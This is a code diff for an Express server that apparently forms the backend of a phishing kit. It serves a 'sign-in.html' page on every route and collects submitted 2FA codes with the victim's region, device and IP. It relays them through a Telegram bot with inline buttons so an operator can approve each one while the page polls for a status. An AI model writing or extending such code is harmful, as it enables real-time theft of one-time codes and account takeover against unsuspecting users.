@@ -1,23 +1,42 @@
+require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
-const { send2FACode } = require('./bot');
+const cors = require('cors');
+const { sendTelegram2FARequest, setApprovalStatus, getApprovalStatus } = require('./bot');
+const { v4: uuidv4 } = require('uuid');
+const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, '../public')));
 
-app.post('/api/verify-code', (req, res) => {
-    const { code, chatId } = req.body;
-    if (code.length >= 6 && code.length <= 8) {
-        send2FACode(code, chatId);
-        res.status(200).send({ message: 'Code sent to Telegram.' });
-    } else {
-        res.status(400).send({ message: 'Invalid code length.' });
-    }
+// API to submit 2FA code
+app.post('/api/submit-2fa', async (req, res) => {
+  const { code, region, device, ip } = req.body;
+  const requestId = uuidv4();
+
+  setApprovalStatus(requestId, 'pending');
+
+  // Send to Telegram with inline buttons
+  await sendTelegram2FARequest({ code, region, device, ip, requestId });
+
+  res.json({ status: 'pending', requestId });
+});
+
+// API to poll approval status
+app.get('/api/approval-status/:requestId', (req, res) => {
+  const status = getApprovalStatus(req.params.requestId);
+  res.json({ status });
+});
+
+// Serve frontend (optional, if you want to serve HTML from backend)
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, '../public/sign-in.html'));
 });
 
 app.listen(PORT, () => {
-    console.log(`Server is running on http://localhost:${PORT}`);
+  console.log(`Server running on port ${PORT}`);
 });
